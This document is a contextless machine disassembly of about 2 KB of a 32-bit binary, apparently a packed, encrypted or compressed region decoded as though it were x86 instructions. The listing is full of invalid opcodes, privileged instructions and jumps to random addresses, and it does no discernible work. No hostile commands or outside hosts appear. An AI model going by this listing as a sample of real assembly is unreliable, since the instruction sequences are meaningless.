  40ca89:	das    
  40ca8a:	test   bl,bl
  40ca8c:	fs je  0x40ca4c
  40ca8f:	sub    BYTE PTR [ecx-0x7aed1916],dl
  40ca95:	ret    0xf251
  40ca98:	push   0xe6e270e6
  40ca9d:	inc    edi
  40ca9e:	stc    
  40ca9f:	retf   
  40caa0:	sub    dl,bl
  40caa2:	hlt    
  40caa3:	jbe    0x40caaf
  40caa5:	sub    DWORD PTR [edx],0x76f67baa
  40caab:	pop    ebp
  40caac:	ss push eax
  40caae:	add    ecx,DWORD PTR [ebx]
  40cab0:	scas   eax,DWORD PTR es:[edi]
  40cab1:	ja     0x40cacc
  40cab3:	bound  ecx,QWORD PTR [ebp+0x7372f6b5]
  40cab9:	xchg   DWORD PTR [bx+si],edx
  40cabc:	xchg   dl,bh
  40cabe:	or     BYTE PTR [edi-0x5f],dh
  40cac1:	mov    cl,0xd8
  40cac3:	pop    ecx
  40cac4:	push   ebp
  40cac5:	jecxz  0x40cae9
  40cac7:	lods   al,BYTE PTR ds:[esi]
  40cac8:	pop    ebp
  40cac9:	sahf   
  40caca:	cld    
  40cacb:	xor    ecx,edx
  40cacd:	outs   dx,BYTE PTR ds:[esi]
  40cace:	xor    bl,BYTE PTR [edx-0x6746908a]
  40cad4:	push   0x21
  40cad6:	jp     0xba7edcc0
  40cadc:	(bad)  
  40cadd:	or     esp,DWORD PTR ds:0x2c9aebed
  40cae3:	(bad)
  40cae7:	(bad)  
  40cae8:	(bad)  
  40cae9:	loope  0x40ca9a
  40caeb:	xchg   ecx,eax
  40caec:	jns    0x40caa5
  40caee:	and    ch,dl
  40caf0:	mov    bl,0x88
  40caf2:	ret    0x7a98
  40caf5:	sbb    eax,0x409a80d8
  40cafa:	test   ebp,eax
  40cafc:	xlat   BYTE PTR ds:[ebx]
  40cafd:	es aam 0x9c
  40cb00:	fidivr DWORD PTR [edx+0x4004bf3f]
  40cb06:	fcomp  DWORD PTR [edi-0x43]
  40cb09:	add    al,0x28
  40cb0b:	inc    esp
  40cb0c:	hlt    
  40cb0d:	pop    edi
  40cb0e:	mov    ds:0x4b59ee75,eax
  40cb13:	jmp    0x40cabb
  40cb15:	stos   DWORD PTR es:[edi],eax
  40cb16:	mov    ebx,0x31573efd
  40cb1b:	and    edx,DWORD PTR [esi+ebx*2]
  40cb1e:	jae    0x40cb23
  40cb20:	mov    ah,0x63
  40cb22:	mov    bl,0x3f
  40cb24:	jp     0x40cab3
  40cb26:	fstp   DWORD PTR [edx+esi*8-0x306bcec5]
  40cb2d:	inc    eax
  40cb2e:	in     al,0xc3
  40cb30:	adc    al,0x4a
  40cb32:	or     dh,BYTE PTR [edx]
  40cb34:	shr    al,cl
  40cb36:	jmp    0x40cb23
  40cb38:	gs jge 0x40cb82
  40cb3b:	ins    DWORD PTR es:[edi],dx
  40cb3c:	(bad)  
  40cb3e:	out    dx,al
  40cb3f:	jecxz  0x40cadd
  40cb41:	(bad)  
  40cb42:	mov    ch,0x3c
  40cb44:	mov    esi,0xc47a6b8
  40cb49:	repz and cl,BYTE PTR [ebx+0x40]
  40cb4d:	push   ecx
  40cb4e:	mov    ch,0x8a
  40cb50:	mov    eax,0xb0ce4be3
  40cb55:	pop    edi
  40cb56:	cmp    DWORD PTR [edx+0x59a9304c],ebx
  40cb5c:	lds    ebp,FWORD PTR [edi]
  40cb5e:	adc    eax,0x3287992e
  40cb63:	mov    DWORD PTR ss:[edi-0x4a0afc87],edi
  40cb6a:	mov    ecx,0x67135e11
  40cb6f:	and    al,BYTE PTR [eax-0x7e0eb1a9]
  40cb75:	sbb    al,0xb5
  40cb77:	imul   eax,ebx,0xffffffd2
  40cb7a:	inc    ebx
  40cb7b:	jbe    0x40cba5
  40cb7d:	(bad)  
  40cb7e:	cdq    
  40cb7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb80:	mov    DWORD PTR [edi+0x6281da4a],ecx
  40cb86:	iret   
  40cb87:	call   0x38da8077
  40cb8c:	jmp    0x7101c149
  40cb91:	cmp    al,0x60
  40cb93:	out    0x87,al
  40cb95:	sub    BYTE PTR [ebp-0x5f],al
  40cb98:	and    BYTE PTR [eax+0x2f],0x7e
  40cb9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb9d:	outs   dx,BYTE PTR ds:[esi]
  40cb9e:	retf   
  40cb9f:	push   ds
  40cba0:	mov    ds:0xd2161042,al
  40cba5:	push   0x6b
  40cba7:	repz jae 0x40cbc4
  40cbaa:	sbb    DWORD PTR [esi+eax*1-0x4399d0cd],0x5b
  40cbb2:	and    DWORD PTR [ecx+edi*1-0x71],ebp
  40cbb6:	int3   
  40cbb7:	ds sub eax,0xf2937ff5
  40cbbd:	fimul  DWORD PTR [ebx-0x566e9387]
  40cbc3:	das    
  40cbc4:	imul   esi,DWORD PTR ds:0x24f3f2bf,0x46
  40cbcb:	loopne 0x40cb8d
  40cbcd:	loope  0x40cb99
  40cbcf:	add    al,0xcc
  40cbd1:	xchg   ebx,eax
  40cbd2:	ret    0x9564
  40cbd5:	sbb    BYTE PTR [edi],dl
  40cbd7:	mov    esp,esp
  40cbd9:	push   es
  40cbda:	xor    dh,dh
  40cbdc:	xlat   BYTE PTR ds:[ebx]
  40cbdd:	dec    edx
  40cbde:	add    eax,0xddd17530
  40cbe3:	cld    
  40cbe4:	stos   DWORD PTR es:[edi],eax
  40cbe5:	scas   al,BYTE PTR es:[edi]
  40cbe6:	cmp    ecx,edi
  40cbe8:	inc    edx
  40cbe9:	shl    BYTE PTR [esi+0x3a1f5607],1
  40cbef:	aaa    
  40cbf0:	mov    dh,0x6
  40cbf2:	cli    
  40cbf3:	mov    ds:0x2fbc83da,eax
  40cbf8:	retf   0x325b
  40cbfb:	mov    ds:0xea62e206,al
  40cc00:	cmp    ch,BYTE PTR [edi-0xc84d1b8]
  40cc06:	fdiv   DWORD PTR [ebx]
  40cc08:	mov    ah,0x91
  40cc0a:	shl    DWORD PTR [edi-0x14],1
  40cc0d:	sub    bh,0xb2
  40cc10:	add    eax,0xa2b34c01
  40cc15:	mov    ecx,0x6647363c
  40cc1a:	mov    edx,0xfc9c12cc
  40cc1f:	mov    edx,0x7ed97a75
  40cc24:	out    dx,eax
  40cc25:	ret    
  40cc26:	mov    dl,0xc3
  40cc28:	sub    DWORD PTR [ebx+0x526e92e7],eax
  40cc2e:	xor    BYTE PTR [edi-0x21],0xf7
  40cc32:	jl     0x40cbdc
  40cc34:	mov    eax,0x8c8a0eca
  40cc39:	jae    0x40cc1f
  40cc3b:	out    dx,eax
  40cc3c:	pushf  
  40cc3d:	mov    ebp,DWORD PTR [ecx+0x35cfbd80]
  40cc43:	lahf   
  40cc44:	gs stos BYTE PTR es:[edi],al
  40cc46:	retf   0xef23
  40cc49:	and    esp,ecx
  40cc4b:	adc    al,0x5
  40cc4d:	pop    es
  40cc4e:	push   eax
  40cc4f:	cs addr16 je 0x40cca2
  40cc53:	xor    dl,ch
  40cc55:	test   DWORD PTR [edi-0x5a4c2f13],0xb27a0a83
  40cc5f:	sbb    DWORD PTR [edx],edi
  40cc61:	mov    ebx,0xcb8cf014
  40cc66:	ror    DWORD PTR [esi-0x152bb2cd],cl
  40cc6c:	add    esp,DWORD PTR [ebx]
  40cc6e:	stos   DWORD PTR es:[edi],eax
  40cc6f:	ret    
  40cc70:	xchg   ebx,eax
  40cc71:	lods   al,BYTE PTR ds:[esi]
  40cc72:	adc    esi,DWORD PTR [esi-0xe0cfab6]
  40cc78:	cs jb  0x40ccdd
  40cc7b:	mov    dl,0x86
  40cc7d:	dec    ebp
  40cc7e:	adc    BYTE PTR [eax-0x67],dh
  40cc81:	sub    esi,esi
  40cc83:	fiadd  WORD PTR ss:[ebx-0xa10b83b]
  40cc8a:	inc    edi
  40cc8b:	pop    es
  40cc8c:	das    
  40cc8d:	fdivr  DWORD PTR [edx]
  40cc8f:	sbb    BYTE PTR [esi-0x3d],ah
  40cc92:	ror    dl,0xb2
  40cc95:	mov    ebp,0x3b158de4
  40cc9a:	adc    BYTE PTR [edi+0x43],bh
  40cc9d:	ror    DWORD PTR [ebx-0x65],1
  40cca0:	mov    ecx,0x32b83fe4
  40cca5:	scas   eax,DWORD PTR es:[edi]
  40cca6:	mov    al,ds:0xdadbacc2
  40ccab:	mov    esi,0x63e372e1
  40ccb0:	les    eax,FWORD PTR ss:[esi+eiz*2+0x2dcdfa31]
  40ccb8:	mov    cl,ah
  40ccba:	adc    al,BYTE PTR [ecx+ecx*2]
  40ccbd:	in     eax,dx
  40ccbe:	cwde   
  40ccbf:	sub    ebx,DWORD PTR [edi+0x63e510b5]
  40ccc5:	pop    ebp
  40ccc6:	loopne 0x40ccec
  40ccc8:	or     DWORD PTR ds:0x59059aad,ecx
  40ccce:	or     edx,eax
  40ccd0:	shl    BYTE PTR [ebx],0xae
  40ccd3:	xlat   BYTE PTR ds:[ebx]
  40ccd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccd5:	pop    ebp
  40ccd6:	das    
  40ccd7:	adc    esi,DWORD PTR [ebx-0x7afe4f7a]
  40ccdd:	stos   BYTE PTR es:[edi],al
  40ccde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccdf:	scas   al,BYTE PTR es:[edi]
  40cce0:	sar    bl,cl
  40cce2:	imul   esi,ebp,0x71831319
  40cce8:	jg     0x40cc7b
  40ccea:	ret    0x1ccc
  40cced:	pop    esp
  40ccee:	inc    edx
  40ccef:	sub    ch,BYTE PTR [edx+ecx*2]
  40ccf2:	rcl    BYTE PTR [esi],0xee
  40ccf5:	dec    esp
  40ccf6:	arpl   WORD PTR [edx+edx*1+0x1c],di
  40ccfa:	add    DWORD PTR [eax],0x46
  40ccfd:	iret   
  40ccfe:	add    al,0xed
  40cd00:	call   0xbda78f66
  40cd05:	sahf   
  40cd06:	push   0x305ed00f
  40cd0b:	daa    
  40cd0c:	xor    eax,DWORD PTR [ebp+0x4d]
  40cd0f:	dec    ebx
  40cd10:	jae    0x40cd0f
  40cd12:	cmp    BYTE PTR [edi+0x11],al
  40cd15:	jmp    FWORD PTR [edx-0x247bd43a]
  40cd1b:	or     BYTE PTR [edx+0x7e7cf6e9],ah
  40cd21:	xchg   edi,eax
  40cd22:	test   al,0xcc
  40cd24:	adc    BYTE PTR [ecx-0xddb817b],dh
  40cd2a:	(bad)  
  40cd2b:	or     al,BYTE PTR ds:0xe008728
  40cd31:	imul   eax,DWORD PTR [esi-0x75],0x18d05e8a
  40cd38:	rcr    ah,cl
  40cd3a:	bound  esi,QWORD PTR [ebx+ebp*2-0x362808c9]
  40cd41:	xchg   ebx,eax
  40cd42:	jno    0x40cd49
  40cd44:	jle    0x40ccdb
  40cd46:	or     DWORD PTR ds:0xa86b294a,edi
  40cd4c:	fstp   QWORD PTR [edx-0x58]
  40cd4f:	inc    esp
  40cd50:	mov    edx,0xac08c163
  40cd55:	pop    ebp
  40cd56:	add    DWORD PTR [eax],0xffffff8f
  40cd59:	scas   eax,DWORD PTR es:[edi]
  40cd5a:	mov    cl,0x9f
  40cd5c:	scas   al,BYTE PTR es:[edi]
  40cd5d:	into   
  40cd5e:	test   ebx,0xc23277b7
  40cd64:	pop    ds
  40cd65:	mov    al,0x56
  40cd67:	or     ebp,esi
  40cd69:	inc    ecx
  40cd6a:	jbe    0x40cdc9
  40cd6c:	mul    BYTE PTR [ecx+ebx*1-0x64710030]
  40cd73:	repnz pop edi
  40cd75:	shr    DWORD PTR [esi+0x6869717e],0x3d
  40cd7c:	jbe    0x40cd01
  40cd7e:	jge    0x40cd91
  40cd80:	xlat   BYTE PTR ds:[ebx]
  40cd81:	xor    DWORD PTR ss:[esi+0x2e985e14],edi
  40cd88:	inc    esp
  40cd8a:	push   ecx
  40cd8b:	out    dx,al
  40cd8c:	push   0xf60e611b
  40cd91:	mov    esi,0x6401d6d5
  40cd96:	int3   
  40cd97:	adc    ecx,edi
  40cd99:	popf   
  40cd9a:	mov    DWORD PTR [ecx+0x1e],ebx
  40cd9d:	or     esi,DWORD PTR [ebx+0x4215c021]
  40cda3:	shl    DWORD PTR [ebx],cl
  40cda5:	jge    0x40cda1
  40cda7:	push   es
  40cda8:	and    edx,DWORD PTR [edi+ebp*2+0x20ae7ea]
  40cdaf:	mov    ecx,0xaa7520e
  40cdb4:	cs in  al,0x6b
  40cdb7:	outs   dx,DWORD PTR ds:[esi]
  40cdb8:	in     eax,dx
  40cdb9:	jne    0x40ce2d
  40cdbb:	xor    ecx,DWORD PTR [esi+eax*2]
  40cdbe:	push   ebx
  40cdbf:	pushf  
  40cdc0:	adc    edi,esp
  40cdc2:	fbld   TBYTE PTR [eax+0xe6d8b07]
  40cdc8:	(bad)  
  40cdc9:	adc    al,0x6b
  40cdcb:	adc    DWORD PTR [edx+0x33],esp
  40cdce:	jns    0x40cd8c
  40cdd0:	imul   esp
  40cdd2:	test   al,0xb2
  40cdd4:	mov    ecx,0xa5f596e5
  40cdd9:	int3   
  40cdda:	mov    ebx,0x310665a3
  40cddf:	inc    esi
  40cde0:	mov    edi,0x1538e84a
  40cde5:	iret   
  40cde6:	mov    al,0x66
  40cde8:	pop    edx
  40cde9:	inc    eax
  40cdea:	cmp    cl,BYTE PTR [edi+edi*4-0x61]
  40cdee:	adc    eax,0x1a6322a2
  40cdf3:	adc    eax,0x335d3143
  40cdf8:	or     edi,DWORD PTR [ebx]
  40cdfa:	fwait
  40cdfb:	adc    eax,DWORD PTR [eax+esi*4+0x2f36db75]
  40ce02:	push   0xffffffca
  40ce04:	xchg   ebx,eax
  40ce05:	in     al,dx
  40ce06:	dec    edx
  40ce07:	or     cl,BYTE PTR [edx+0x5b]
  40ce0a:	mov    eax,ds:0x148fe9d0
  40ce0f:	mov    al,ds:0x23fc91a
  40ce14:	push   ebp
  40ce15:	cmp    cl,BYTE PTR [esi]
  40ce17:	mov    bl,0xce
  40ce19:	push   ds
  40ce1a:	push   eax
  40ce1b:	std    
  40ce1c:	ficom  WORD PTR [esi+esi*1]
  40ce1f:	xor    esp,DWORD PTR [ebx+0x466b84f9]
  40ce25:	jge    0x40cdea
  40ce27:	shl    dh,1
  40ce29:	and    eax,0x5d6f346
  40ce2e:	jg     0x40ce3a
  40ce30:	cwde   
  40ce31:	xor    eax,0x3dc9a694
  40ce36:	in     al,dx
  40ce37:	push   esp
  40ce38:	jecxz  0x40ce2a
  40ce3a:	push   ds
  40ce3b:	jns    0x40ce7f
  40ce3d:	xchg   ecx,eax
  40ce3e:	cmp    BYTE PTR [edi+ecx*2-0x70680af2],ch
  40ce45:	jl     0x40ce25
  40ce47:	mov    eax,0xbd888b78
  40ce4c:	inc    esp
  40ce4d:	or     DWORD PTR [ebx-0x72],eax
  40ce50:	push   esp
  40ce51:	cmp    bl,BYTE PTR [esi-0x2503a6c2]
  40ce57:	sahf   
  40ce58:	jnp    0x40cded
  40ce5a:	hlt    
  40ce5b:	adc    ah,BYTE PTR [edi+ebx*4]
  40ce5e:	mov    esi,0x115d30c0
  40ce63:	pop    edi
  40ce64:	dec    esi
  40ce65:	xchg   ebp,eax
  40ce66:	sub    cl,dl
  40ce68:	mov    edi,0x41f977b6
  40ce6d:	aas    
  40ce6e:	int3   
  40ce6f:	pushf  
  40ce70:	aas    
  40ce71:	xchg   ebp,eax
  40ce72:	sahf   
  40ce73:	dec    eax
  40ce74:	shl    BYTE PTR [esi-0x1f],cl
  40ce77:	jmp    0x40ce3c
  40ce79:	ja     0x40ce59
  40ce7b:	pop    edx
  40ce7c:	popa   
  40ce7d:	jns    0x40cedc
  40ce7f:	xor    eax,0x645ed52f
  40ce84:	sub    al,0xbf
  40ce86:	xchg   BYTE PTR [ecx-0x5e],al
  40ce89:	outs   dx,BYTE PTR ds:[esi]
  40ce8a:	sbb    al,0x65
  40ce8c:	mov    ebx,0x69b83060
  40ce91:	out    0x52,eax
  40ce93:	pop    esp
  40ce94:	push   esp
  40ce95:	iret   
  40ce96:	scas   eax,DWORD PTR es:[edi]
  40ce97:	xchg   ebp,eax
  40ce98:	comiss xmm2,DWORD PTR [ebx]
  40ce9b:	out    0x5f,al
  40ce9d:	push   edx
  40ce9e:	or     DWORD PTR [eax-0x64],ebx
  40cea1:	push   esp
  40cea2:	fs push 0x46
  40cea5:	lods   al,BYTE PTR ds:[esi]
  40cea6:	sub    al,0x2b
  40cea8:	(bad)  
  40cea9:	arpl   WORD PTR [ebx],dx
  40ceab:	xchg   bh,cl
  40cead:	fcom   QWORD PTR [ebx-0x3dfeb1f3]
  40ceb3:	shl    DWORD PTR [esi-0x163f4ff0],0x63
  40ceba:	jmp    0xcbcb4a29
  40cebf:	sar    BYTE PTR [edi],0x87
  40cec2:	and    edi,DWORD PTR [edi-0xc]
  40cec5:	mov    eax,0xb1c79a71
  40ceca:	xchg   ebp,eax
  40cecb:	or     DWORD PTR [ecx-0x5cd2702c],esp
  40ced1:	in     eax,dx
  40ced2:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40ced4:	xchg   bl,bh
  40ced6:	xor    DWORD PTR [edx-0x56],eax
  40ced9:	dec    eax
  40ceda:	mov    dl,0xf3
  40cedc:	iret   
  40cedd:	mov    esi,0x98b2718e
  40cee2:	sbb    eax,0xf0203501
  40cee7:	mov    ah,ch
  40cee9:	mov    eax,0x4320276c
  40ceee:	int3   
  40ceef:	je     0x40cf3e
  40cef1:	dec    esp
  40cef2:	(bad)  
  40cef3:	loopne 0x40ceaa
  40cef5:	push   ss
  40cef6:	aas    
  40cef7:	inc    edx
  40cef8:	jne    0x40ceb6
  40cefa:	lahf   
  40cefb:	add    bl,BYTE PTR [eax+0x5d4d4b9d]
  40cf01:	jp     0x40ce87
  40cf03:	push   es
  40cf04:	ss pop edi
  40cf06:	ret    0x1e8f
  40cf09:	or     eax,0x2aa874a2
  40cf0e:	nop
  40cf0f:	iret   
  40cf10:	push   edi
  40cf11:	in     eax,0xda
  40cf13:	pusha  
  40cf14:	inc    edx
  40cf15:	jecxz  0x40cf52
  40cf17:	ror    al,0x25
  40cf1a:	jnp    0x40cf33
  40cf1c:	ja     0x40cf0c
  40cf1e:	pop    ecx
  40cf1f:	pushf  
  40cf20:	mov    eax,ds:0xdd4c40ba
  40cf25:	imul   edi,DWORD PTR [eax-0x1a],0x272e1d2f
  40cf2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf2d:	mov    edi,0xed5f3bd9
  40cf32:	loope  0x40ceec
  40cf34:	cmp    edi,DWORD PTR ds:[esi+0x6353ef6b]
  40cf3b:	arpl   di,si
  40cf3d:	sub    ebx,edi
  40cf3f:	in     eax,0xef
  40cf41:	pop    eax
  40cf42:	jmp    0x959cad0b
  40cf47:	xor    al,0xd1
  40cf49:	push   edx
  40cf4a:	neg    BYTE PTR [ecx-0x768308b6]
  40cf50:	sub    eax,0x6ac047f3
  40cf55:	mov    esp,0x8abb46aa
  40cf5a:	jbe    0x40ceea
  40cf5c:	inc    edi
  40cf5d:	sub    bh,BYTE PTR [esi]
  40cf5f:	stos   BYTE PTR es:[edi],al
  40cf60:	les    edi,FWORD PTR [eax+0x2f8a5d10]
  40cf66:	sbb    ebp,ebx
  40cf68:	xchg   sp,ax
  40cf6a:	jmp    0x40cf8f
  40cf6c:	rcr    bl,1
  40cf6e:	arpl   WORD PTR [edi],si
  40cf70:	inc    edx
  40cf71:	jmp    0x8c5a:0x673ae123
  40cf78:	test   bh,ah
  40cf7a:	fmul   QWORD PTR [ebx-0x40]
  40cf7d:	in     eax,dx
  40cf7e:	ficomp DWORD PTR [ebp-0x15]
  40cf81:	rol    cl,1
  40cf83:	mov    eax,0xaa551e52
  40cf88:	cli    
  40cf89:	imul   edx,esp,0x50
  40cf8c:	and    esp,ebx
  40cf8e:	push   ss
  40cf8f:	mov    esi,0xb1cd2e13
  40cf94:	jbe    0x40cf5d
  40cf96:	ds sbb ebp,esp
  40cf99:	daa    
  40cf9a:	jno    0x40cff1
  40cf9c:	add    eax,0xe8002359
  40cfa1:	lock scas eax,DWORD PTR es:[edi]
  40cfa3:	test   DWORD PTR [ebx],edx
  40cfa5:	mov    edx,0x945fd80c
  40cfaa:	xor    DWORD PTR [ecx+0xf],0xdded31fb
  40cfb1:	sub    esi,DWORD PTR [eax-0x15]
  40cfb4:	jge    0x40cfe0
  40cfb6:	pop    es
  40cfb7:	sti    
  40cfb8:	mov    ds:0xd7131783,eax
  40cfbd:	(bad)  [ebx+0x38b6d6ab]
  40cfc3:	iret   
  40cfc4:	adc    ch,BYTE PTR [ecx+0x68]
  40cfc7:	iret   
  40cfc8:	aam    0x5e
  40cfca:	or     DWORD PTR [esi-0x316e5298],ebp
  40cfd0:	cmc    
  40cfd1:	nop
  40cfd2:	scas   al,BYTE PTR es:[edi]
  40cfd3:	adc    dl,BYTE PTR [ebx+0x65]
  40cfd6:	int    0xfa
  40cfd8:	repnz add eax,0x4fd04f2d
  40cfde:	imul   DWORD PTR [ebp-0x5f4637ff]
  40cfe4:	xchg   ecx,esp
  40cfe6:	jp     0x40cff2
  40cfe8:	mov    edx,0xf9f483f3
  40cfed:	sbb    BYTE PTR [ecx+edi*2],bl
  40cff0:	repnz and bh,BYTE PTR [edx-0x112c917e]
  40cff7:	cmp    dh,BYTE PTR ds:0xbced0375
  40cffd:	add    DWORD PTR [eax-0x4d],0x60
  40d001:	add    eax,0x22a71114
  40d006:	dec    ebx
  40d007:	jg     0x40cfe1
  40d009:	push   esi
  40d00a:	retf   
  40d00b:	xor    al,0x3d
  40d00d:	ins    DWORD PTR es:[edi],dx
  40d00e:	dec    BYTE PTR [ebx]
  40d010:	mov    esi,0x7ca4bb59
  40d015:	fist   DWORD PTR [esi+0x7b8ebb6f]
  40d01b:	adc    edx,DWORD PTR [ecx+0x1297290f]
  40d021:	lds    ebx,FWORD PTR [eax-0x6003aa23]
  40d027:	sbb    dh,BYTE PTR [edx]
  40d029:	or     dl,BYTE PTR [ebp+0x7d7d3de0]
  40d02f:	outs   dx,BYTE PTR ds:[esi]
  40d030:	mov    edi,0x46eada28
  40d035:	dec    esp
  40d036:	sub    al,0xd1
  40d038:	nop
  40d039:	iret   
  40d03a:	sub    BYTE PTR [ecx],al
  40d03c:	loope  0x40cff9
  40d03e:	inc    ebp
  40d03f:	iret   
  40d040:	shr    DWORD PTR [esi+0x34a2cf39],0xa2
  40d047:	mov    ah,0x6c
  40d049:	icebp  
  40d04a:	outs   dx,BYTE PTR ds:[esi]
  40d04b:	iret   
  40d04c:	sub    al,0x57
  40d04e:	jl     0x40d0ba
  40d050:	add    edx,0xffffff80
  40d053:	or     BYTE PTR [eax],0x9e
  40d056:	sbb    ah,BYTE PTR [esi-0x42d8949f]
  40d05c:	cdq    
  40d05d:	ins    DWORD PTR es:[edi],dx
  40d05e:	jle    0x40d071
  40d060:	neg    ah
  40d062:	mov    eax,ds:0x4a630d69
  40d067:	outs   dx,BYTE PTR ds:[esi]
  40d068:	popa   
  40d069:	data16 lods al,BYTE PTR ds:[esi]
  40d06b:	popf   
  40d06c:	dec    ebx
  40d06d:	or     eax,0xa11f3060
  40d072:	mov    al,ds:0x9d7280d4
  40d077:	sub    BYTE PTR [ebx-0x1c],dl
  40d07a:	mov    bl,0x10
  40d07c:	in     al,0xdc
  40d07e:	aas    
  40d07f:	or     eax,0x7fce46fc
  40d084:	pushf  
  40d085:	test   BYTE PTR [ecx+0x5c8345cd],bl
  40d08b:	mov    edi,0x8566802a
  40d090:	scas   eax,DWORD PTR es:[edi]
  40d091:	pop    es
  40d092:	(bad)  
  40d093:	out    dx,al
  40d094:	mov    dl,0x69
  40d096:	xchg   edi,eax
  40d097:	cli    
  40d098:	mov    bl,0xfe
  40d09a:	dec    ebx
  40d09b:	test   al,0x7
  40d09d:	jo     0x40d06a
  40d09f:	jo     0x40d03b
  40d0a1:	scas   al,BYTE PTR es:[edi]
  40d0a2:	sub    eax,0xd4f27a96
  40d0a7:	dec    edi
  40d0a8:	ins    DWORD PTR es:[edi],dx
  40d0a9:	sub    eax,0x5f043d68
  40d0ae:	inc    ebx
  40d0af:	pop    esi
  40d0b0:	jnp    0x40d0a2
  40d0b2:	aaa    
  40d0b3:	ins    DWORD PTR es:[edi],dx
  40d0b4:	adc    ebx,ebp
  40d0b6:	fadd   DWORD PTR [edi]
  40d0b8:	cwde   
  40d0b9:	mov    esi,0x4dafe016
  40d0be:	xor    DWORD PTR [ebx],esi
  40d0c0:	clts   
  40d0c2:	sub    dh,BYTE PTR [ecx+0xc52a759]
  40d0c8:	mov    eax,ds:0x4c5cf169
  40d0cd:	ins    BYTE PTR es:[edi],dx
  40d0ce:	sbb    ebx,esp
  40d0d0:	sbb    dh,BYTE PTR [ebp+0x68]
  40d0d3:	pop    edi
  40d0d4:	imul   ebp,ecx,0xffffff98
  40d0d7:	daa    
  40d0d8:	add    BYTE PTR [edi+0x427a620d],bh
  40d0de:	ds loopne 0x40d138
  40d0e1:	push   ds
  40d0e2:	inc    ecx
  40d0e3:	push   esp
  40d0e4:	iret   
  40d0e5:	in     al,dx
  40d0e6:	nop
  40d0e7:	cmp    eax,0xec4b6505
  40d0ec:	addr16 rcl dh,1
  40d0ef:	dec    ebx
  40d0f0:	mov    al,0x38
  40d0f2:	mov    al,ds:0x6ef43128
  40d0f7:	dec    edx
  40d0f8:	jecxz  0x40d0a5
  40d0fa:	jmp    0xaf9b:0x9e87dd67
  40d101:	sahf   
  40d102:	bound  edx,QWORD PTR [esi-0x3ea9dfa5]
  40d108:	lfs    ecx,FWORD PTR [eax-0x2ec79b7]
  40d10f:	int3   
  40d110:	cmovae ecx,DWORD PTR [esi]
  40d113:	xchg   ecx,eax
  40d114:	mov    eax,0x1155caf0
  40d119:	inc    eax
  40d11a:	enter  0x2adc,0x33
  40d11e:	sub    al,0x15
  40d120:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d121:	test   al,0x46
  40d123:	pop    edx
  40d124:	dec    esi
  40d125:	fwait
  40d126:	or     BYTE PTR [eax-0x71],cl
  40d129:	in     eax,0xc1
  40d12b:	jne    0x40d181
  40d12d:	je     0x40d0e5
  40d12f:	hlt    
  40d130:	xchg   BYTE PTR [ecx],bh
  40d132:	fisubr DWORD PTR ds:0xf3b9920f
  40d138:	pop    edx
  40d139:	mov    eax,ds:0x49bd85eb
  40d13e:	inc    esi
  40d13f:	push   ebp
  40d140:	les    esi,FWORD PTR [esi-0x2d]
  40d143:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40d145:	leave  
  40d146:	out    0x4f,eax
  40d148:	jmp    0x40d0ef
  40d14a:	lods   al,BYTE PTR ds:[esi]
  40d14b:	add    BYTE PTR [ebx+0x2a],0x7c
  40d14f:	mov    dh,0x81
  40d151:	outs   dx,BYTE PTR ds:[esi]
  40d152:	mov    dh,BYTE PTR ds:0x7f70ae52
  40d158:	mov    bl,0xa4
  40d15a:	push   0x13c5aebd
  40d15f:	jp     0x40d116
  40d161:	xchg   ecx,eax
  40d162:	lods   ax,WORD PTR ds:[esi]
  40d164:	and    cl,BYTE PTR [eax-0x3]
  40d167:	test   al,0xf9
  40d169:	scas   al,BYTE PTR es:[edi]
  40d16a:	repz repnz popa 
  40d16d:	retf   
  40d16e:	pop    eax
  40d16f:	(bad)  
  40d170:	shr    DWORD PTR [edi-0x69fd634d],0x8a
  40d177:	cmovo  esp,esp
  40d17a:	mov    ah,0xa6
  40d17c:	push   ecx
  40d17d:	arpl   WORD PTR [ebp+eiz*8-0x3b],bx
  40d181:	push   0x75222b3a
  40d186:	scas   eax,DWORD PTR es:[edi]
  40d187:	fst    DWORD PTR cs:[edi]
  40d18a:	lahf   
  40d18b:	js     0x40d162
  40d18d:	adc    esi,DWORD PTR [ecx-0x41ce62c9]
  40d193:	sub    dh,BYTE PTR [esi+0x3a]
  40d196:	inc    eax
  40d197:	dec    esp
  40d198:	std    
  40d199:	mov    ds:0x573b28e8,al
  40d19e:	int3   
  40d19f:	inc    esi
  40d1a0:	jno    0x40d21e
  40d1a2:	mov    dl,0x2a
  40d1a4:	mov    esi,0x8bd1e782
  40d1a9:	jae    0x40d19b
  40d1ab:	dec    esp
  40d1ac:	add    BYTE PTR [eax],cl
  40d1ae:	repnz cmp BYTE PTR [eax+0x6905c3f6],dl
  40d1b5:	cmp    al,0x8d
  40d1b7:	mov    ebp,0x589a91bf
  40d1bc:	out    0x55,eax
  40d1be:	sub    eax,0x33e1ba68
  40d1c3:	fs addr16 in al,dx
  40d1c6:	cli    
  40d1c7:	xchg   ecx,eax
  40d1c8:	lods   eax,DWORD PTR ds:[esi]
  40d1c9:	or     al,0xfd
  40d1cb:	push   es
  40d1cc:	jo     0x40d208
  40d1ce:	hlt    
  40d1cf:	cmp    ch,BYTE PTR [ebp+0x4e]
  40d1d2:	or     al,0x1c
  40d1d4:	jge    0x40d1b9
  40d1d6:	mov    ds:0xc6dff85c,al
  40d1db:	and    BYTE PTR [ebx],0x48
  40d1de:	das    
  40d1df:	pop    edi
  40d1e0:	dec    eax
  40d1e1:	and    BYTE PTR [eax],0xe0
  40d1e4:	fimul  DWORD PTR [ebx+eax*4+0x373bf2f7]
  40d1eb:	mov    dh,ah
  40d1ed:	sbb    eax,0x41f009b9
  40d1f2:	adc    eax,0x97bb94be
  40d1f7:	push   eax
  40d1f8:	int3   
  40d1f9:	imul   edi,DWORD PTR [ecx+esi*8+0x71],0x71
  40d1fe:	xor    ch,BYTE PTR [edi]
  40d200:	sbb    eax,0xe6b4e578
  40d205:	loopne 0x40d1d5
  40d207:	ficomp DWORD PTR [edi-0x653226e1]
  40d20d:	jae    0x40d232
  40d20f:	push   esi
  40d210:	(bad)  
  40d211:	xlat   BYTE PTR ds:[ebx]
